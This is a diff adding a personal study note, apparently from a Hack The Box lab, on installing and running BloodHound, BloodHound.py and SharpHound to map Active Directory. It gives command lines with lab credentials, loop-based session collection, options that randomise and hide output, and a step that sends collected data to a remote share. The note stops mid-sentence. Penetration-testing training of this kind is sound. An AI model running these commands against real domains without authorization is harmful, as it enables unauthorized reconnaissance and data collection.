@@ -1,0 +1,91 @@
+install bloodhound
+sudo apt-get install bloodhound, This will install bloodhound and neo4j
+
+install BloodHound.py with pip install bloodhound or by cloning its repository and running python setup.py install. To run, it requires impacket, ldap3, and dnspython. The tool can be installed via pip by typing the following command
+
+pip install bloodhound
+
+use BloodHound.py in Linux, we will need --domain and --collectionmethod options and the authentication method. 
+
+Authentication can be a username and password, an NTLM hash, an AES key, or a ccache file.
+
+
+BloodHound.py will try to use the Kerberos authentication method by default, and if it fails, it will fall back to NTLM.
+
+bloodhound-python -d inlanefreight.htb -c DCOnly -u htb-student -p HTBRocks! -ns 10.129.204.207 -k
+
+Using BloodHound.py with Kerberos authentication
+
+bloodhound-python -d inlanefreight.htb -c DCOnly -u htb-student -p HTBRocks! -ns 10.129.204.207 --kerberos
+
+
+
+There is also rusthound, azurehound, sharphound, bloodhound github repos to install and get the information
+
+once its installed and ran,
+
+start neo4j 
+run bloodhound
+
+drag and drop the installed files into bloodhound
+
+start with searching for the domain
+
+
+-h or --help will give a list of different arguments to do
+![alt text](image-26.png)
+
+visit the BloodHound documentation page. for more information
+
+if we get credentials from a user other than the context from which we are running, we can use the --ldapusername and --ldappassword options to run SharpHound using those credentials.
+
+Another flag we find helpful is -d or --domain. Although this option is assigned by default, if we are in an environment where multiple domains exist, we can use this option to ensure that SharpHound will collect the information from the domain we specify.
+
+SharpHound will capture the domain controller automatically, but if we want to target a specific DC, we can use the option --domaincontroller followed by the IP or FQDN of the target domain controller.
+
+Randomize and hide SharpHound Output
+
+![alt text](image-27.png)
+
+we can also Start a shared folder with username and password
+
+![alt text](image-28.png)
+
+![alt text](image-29.png)
+
+Running SharpHound and saving the output to a shared folder
+
+C:\htb> C:\Tools\SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword HackTheBox --outputprefix HTB --randomfilenames
+
+Looking for Active Sessions
+
+using "net session"
+
+
+if there is no active session
+
+sharphound has a loop argument
+
+![alt text](image-30.png)
+
+example: SharpHound.exe -c Session --loop --loopduration 01:00:00 --loopinterval 00:01:00
+
+
+
+Running from Non-Domain-Joined Systems
+
+Sometimes we might need to run SharpHound from a computer, not a domain member, such as when conducting a Hack The Box attack or internal penetration test with only network access.
+
+we can use "runas /netonly /user:<DOMAIN>\<username> <app>" to execute the application with specific user credentials. The /netonly flag ensures network access using the provided credentials.
+
+
+Before using SharpHound, we need to be able to resolve the DNS names of the target domain, and  if we have network access to the domain's DNS server, we can configure our network card DNS settings to that server.
+
+If this is not the case, we can set up our hosts file and include the DNS names of the domain controller.
+
+
+afer running the command on line 61
+
+we do net view \\domain name\
+
+Run SharpHound.exe with the option --domain:
